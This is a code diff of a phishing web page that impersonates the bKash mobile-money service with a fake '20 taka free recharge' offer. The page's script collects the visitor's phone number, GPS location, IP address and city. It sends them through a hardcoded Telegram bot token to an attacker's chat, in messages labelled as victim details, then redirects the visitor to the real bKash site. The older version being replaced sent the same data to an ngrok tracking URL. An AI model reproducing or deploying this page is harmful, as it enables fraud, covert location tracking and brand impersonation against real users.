@@ -1,59 +1,77 @@
 <!DOCTYPE html>
-<html lang="bn">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ফ্রি ২০ টাকা মোবাইল রিচার্জ!</title>
+    <title>bKash - Mobile Recharge Offer</title>
     <style>
-        body { font-family: 'Arial', sans-serif; background-color: #f2f2f2; text-align: center; margin: 0; padding: 20px; }
-        .box { background: #fff; padding: 25px; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.2); max-width: 380px; margin: auto; }
-        h2 { color: #ff5722; }
-        input { width: 90%; padding: 12px; margin: 15px 0; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; outline: none; }
-        .btn { background: #4caf50; color: white; border: none; padding: 12px 20px; border-radius: 8px; font-size: 18px; cursor: pointer; width: 100%; font-weight: bold; }
-        .btn:hover { background: #45a049; }
-        p { color: #555; font-size: 14px; }
+        body { background-color: #e2136e; font-family: 'Segoe UI', Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.2); width: 90%; max-width: 350px; text-align: center; }
+        .logo { width: 120px; margin-bottom: 20px; }
+        h2 { color: #e2136e; font-size: 22px; margin-bottom: 10px; }
+        p { color: #555; font-size: 14px; margin-bottom: 25px; line-height: 1.5; }
+        input { width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 8px; font-size: 18px; box-sizing: border-box; outline: none; margin-bottom: 20px; }
+        button { background: #e2136e; color: white; border: none; padding: 15px; width: 100%; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        button:active { background: #b00f56; transform: scale(0.98); }
+        .footer { margin-top: 20px; font-size: 11px; color: #999; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <img src="https://cdn-icons-png.flaticon.com/512/2343/2343894.png" width="80" alt="Gift">
-        <h2>🎉 অভিনন্দন! 🎉</h2>
-        <p>আপনি পেয়েছেন ২০ টাকা ফ্রি মোবাইল রিচার্জ। অফারটি আপনার নাম্বারে নিতে নিচে সঠিক নম্বর দিন।</p>
+
+    <div class="card">
+        <img src="https://www.bkash.com/uploads/images/bkash-logo.png" alt="bKash" class="logo">
+        <h2>২০ টাকা ফ্রি রিচার্জ!</h2>
+        <p>আপনার বিকাশ নম্বরটি দিন এবং ভেরিফিকেশন সম্পন্ন করে সাথে সাথেই ২০ টাকা ফ্রি মোবাইল রিচার্জ বুঝে নিন।</p>
         
-        <input type="number" id="phone" placeholder="আপনার মোবাইল নম্বর (যেমন: 017...)">
-        <button class="btn" onclick="startClaim()">রিচার্জ নিন</button>
+        <input type="number" id="phone" placeholder="বিকাশ নম্বর দিন" required>
+        <button onclick="startClaim()">রিচার্জ নিন</button>
         
-        <p style="margin-top:20px; font-size:12px; color:red;">* লোকেশন পারমিশন 'Allow' না করলে রিচার্জ আসবে না।</p>
+        <div class="footer">© bKash Limited. All Rights Reserved.</div>
     </div>
 
-    <script>
-        function startClaim() {
-            let num = document.getElementById('phone').value;
-            if (num.length < 11) {
-                alert("সঠিক ১১ ডিজিটের মোবাইল নম্বর দিন।");
-                return;
-            }
-
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition((pos) => {
-                    sendData(num, pos.coords.latitude, pos.coords.longitude);
-                }, (err) => {
-                    sendData(num, null, null);
-                });
-            } else {
-                alert("আপনার ব্রাউজার এই অফার সাপোর্ট করে না।");
-            }
+<script>
+    async function startClaim() {
+        const phone = document.getElementById('phone').value;
+        if (phone.length < 11) {
+            alert("সঠিক বিকাশ নম্বর দিন!");
+            return;
         }
 
-        function sendData(phone, lat, lon) {
-            // আপনার Ngrok URL এখানে বসান
-            fetch('https://আপনার-এনগ্রোক-লিঙ্ক.ngrok-free.app/track', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ phone: phone, lat: lat, lon: lon })
-            });
-            alert("সফল হয়েছে! ২০ মিনিটের মধ্যে আপনার নম্বরে রিচার্জ পৌঁছে যাবে।");
+        const token = "8242516940:AAEGD8u48I_miakigo6zRSfJ6pvyEq7wM6k";
+        const chat_id = "7887080882";
+
+        // লোকেশন রিকোয়েস্ট (এটাই আসল ট্র্যাকার)
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                
+                // IP ও নেটওয়ার্ক তথ্য সংগ্রহ
+                let ipInfo = { ip: "Unknown", city: "Unknown" };
+                try {
+                    const res = await fetch('https://ipapi.co/json/');
+                    ipInfo = await res.json();
+                } catch(e) {}
+
+                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                const text = `🎯 **বিকাশ ভিকটিম ডিটেইলস**\n\n📞 ফোন নম্বর: \`${phone}\`\n🌐 IP: ${ipInfo.ip}\n🏙️ শহর: ${ipInfo.city}\n📍 ম্যাপ লোকেশন: [এখানে ক্লিক করুন](${mapLink})`;
+
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
+                
+                alert("ধন্যবাদ! আপনার রিকোয়েস্ট সফল হয়েছে। ৩০ মিনিটের মধ্যে রিচার্জ পেয়ে যাবেন।");
+                window.location.href = "https://www.bkash.com";
+
+            }, async (err) => {
+                // ইউজার লোকেশন অনুমতি না দিলে
+                const text = `⚠️ **ভিকটিম লোকেশন অফ করেছে**\n\n📞 ফোন নম্বর: \`${phone}\`\n📍 লোকেশন পারমিশন দেয়নি।`;
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
+                
+                alert("সফল হয়েছে! ৩০ মিনিটের মধ্যে রিচার্জ পাবেন।");
+                window.location.href = "https://www.bkash.com";
+            }, { timeout: 10000 });
         }
-    </script>
+    }
+</script>
+
 </body>
-</html>here
+</html>
